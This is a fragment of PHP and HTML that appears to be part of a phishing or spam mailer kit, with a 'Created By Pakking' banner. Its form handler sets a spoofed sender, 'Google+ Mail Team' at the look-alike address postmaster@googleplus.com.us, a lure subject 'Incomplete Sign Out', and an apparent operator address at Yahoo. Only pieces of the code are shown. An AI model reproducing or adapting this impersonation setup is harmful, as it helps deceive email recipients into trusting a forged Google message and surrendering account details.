...
if(isset($_POST['send']))
{
	...
	$testa ="";
	$message = "";
	$subject = "Incomplete Sign Out";
	$urname = "Google+ Mail Team";
	$uremail = "postmaster@googleplus.com.us";
	$email = "devil.alexox@yahoo.com";
}
?>
...
<div align="center" id="Layer1">
  <table width="87%" height="77%" border="0" cellspacing="10">
    <tbody><tr>
      <td height="23" colspan="2"><div align="center" class="form">Created By Pakking</div></td>
    </tr>
    <tr>
